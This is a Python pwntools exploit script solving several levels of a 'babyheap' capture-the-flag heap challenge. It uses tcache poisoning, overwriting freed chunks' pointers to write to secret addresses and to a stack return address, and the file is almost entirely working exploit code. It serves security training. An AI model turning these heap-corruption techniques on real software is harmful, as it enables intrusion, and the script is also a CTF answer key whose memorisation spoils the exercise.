#!/usr/bin/python3
from pwn import *


def prepare(p):
    p.recvuntil('quit):')

def malloc(p, size: str):
    prepare(p)
    p.sendline('malloc')
    p.sendline(size)

def malloc_id(p, chunk_id: bytes, size: bytes):
    prepare(p)
    p.sendline('malloc')
    p.sendline(chunk_id)
    p.sendline(size)

def send_flag(p, data: bytes):
    prepare(p)
    p.sendline('send_flag')
    p.sendline(data)

def free(p):
    prepare(p)
    p.sendline('free')

def free_id(p, chunk_id: bytes):
    prepare(p)
    p.sendline('free')
    p.sendline(chunk_id)

def scanf(p, content: bytes):
    prepare(p)
    p.sendline('scanf')
    p.sendline(content)

def scanf_id(p, content: bytes, chunk_id: bytes):
    prepare(p)
    p.sendline('scanf')
    p.sendline(chunk_id)
    p.sendline(content)

def get_addr(p):
    for _ in range(7):
        p.recvline()
    data = p.recvline()
    addr = int(data.split(b'|')[1].strip(), 16)
    return addr

def level4(p):
    malloc(p, b'20')
    free(p)
    malloc(p, b'372')
    free(p)
    addr = get_addr(p)
    scanf(p, p64(addr))
    malloc(p, b'16')
    scanf(p, b'A'*16 + p64(372))

def level6(p):
    secret = 0x420000 + 0x5e31

    malloc_id(p, b'0', b'100')
    malloc_id(p, '1', '100')
    free_id(p, b'0') 
    free_id(p, b'1') 
    scanf_id(p, p64(secret), b'1')

def level7(p):
    secret = 0x420000 + 0xb136

    malloc_id(p, b'0', b'100')
    malloc_id(p, '1', '100')
    free_id(p, b'0') 
    free_id(p, b'1') 
    scanf_id(p, p64(secret), b'1')

def level9(p):
    secret = 0x422a68 - 8

    malloc_id(p, b'0', b'16')
    malloc_id(p, '1', '16')
    free_id(p, b'0') 
    free_id(p, b'1') 
    scanf_id(p, p64(secret), b'1')

    malloc_id(p, b'3', b'16')
    malloc_id(p, b'4', b'16')

    malloc_id(p, b'4', b'16')
    malloc_id(p, '5', '16')
    free_id(p, b'4') 
    free_id(p, b'5') 
    scanf_id(p, p64(secret+8), b'5')

    malloc_id(p, b'6', b'16')
    malloc_id(p, b'7', b'16')

    send_flag(p, b'\x00'*16)

def level10(p):
    for _ in range(10):
        data = p.recvline() # skip lame lines
    data = data.split(b' ')[10].strip()
    data = data[:len(data)-1]   # remove period
    stack_addr = int(data, 16)

    for _ in range(2):
        data = p.recvline()
    data = data.split(b' ')[7].strip()
    data = data[:len(data)-1]   # remove period
    main_addr = int(data, 16)

    malloc_id(p, b'0', b'100')
    malloc_id(p, '1', '100')
    free_id(p, b'0') 
    free_id(p, b'1') 
    scanf_id(p, p64(stack_addr+0x118), b'1')
    malloc_id(p, '2', '100')
    malloc_id(p, '3', '100')
    scanf_id(p, p64(main_addr-0xfd), b'3')


#p = process('/challenge/babyheap_level10.0')
p = gdb.debug(['./ld-2.31.so', '--preload', './libc.so.6', './babyheap_level10.1'], gdbscript= '''
c
''')

#level10(p)
p.interactive()
